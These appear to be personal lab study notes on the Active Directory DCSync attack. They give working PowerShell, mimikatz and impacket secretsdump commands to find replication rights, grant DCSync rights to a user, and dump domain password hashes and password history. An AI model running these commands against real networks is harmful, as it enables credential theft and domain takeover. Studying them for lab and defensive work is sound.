---
title: DCSync
date: M02-18-2023
author: i4
---
- Permission: `IDL_DRSGetNCChanges`

## Info
- Uses: `Directory Replication Service Remote Protocol (MS-DRSR)`

A domain controller receiving a request for an update does not verify that the request came from a known domain controller, but only that the associated SID has appropriate privileges.

- Can be scanned for with [ADACLScanner](https://github.com/canix1/ADACLScanner)

## Requirements
- Compromised: 
	- Domain Admins
	- Enterprise Admins
	- Domain Controllers
 
## Check who has the permissions:
```
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

## Giving somebody DCSync permissions

```
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

### Checking
```
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

## Using mimikatz
```mimikatz
mimikatz # lsadump::dcsync /user:Administrator
```

## With IMPacket
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
